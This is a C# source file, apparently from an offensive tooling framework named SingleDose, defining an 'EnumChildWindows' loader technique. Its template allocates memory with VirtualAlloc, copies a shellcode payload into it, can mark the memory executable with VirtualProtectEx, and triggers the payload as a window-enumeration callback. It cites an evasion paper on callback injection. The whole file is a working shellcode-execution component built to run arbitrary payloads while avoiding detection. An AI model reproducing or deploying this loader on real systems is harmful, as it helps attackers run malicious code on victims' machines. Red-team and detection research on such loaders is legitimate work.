using System.Collections.Generic;

namespace SingleDose.Techniques.Loaders
{
    internal class EnumChildWindows : ITechnique
    {
        string ITechnique.TechniqueName => "EnumChildWindows";

        string ITechnique.TechniqueDescription => null;

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://papers.vx-underground.org/papers/Windows/Evasion%20-%20Process%20Creation%20and%20Shellcode%20Execution/Callback%20Injection%20via%20EnumChildWindows.cpp"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => true;
        
        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "EnumChildWindows" };
        
        List<string> ITechnique.Prerequisites => null;
        
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            EnumChildWindows(IntPtr.Zero, hAlloc, IntPtr.Zero);
        }
        {{ARGS}}
        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
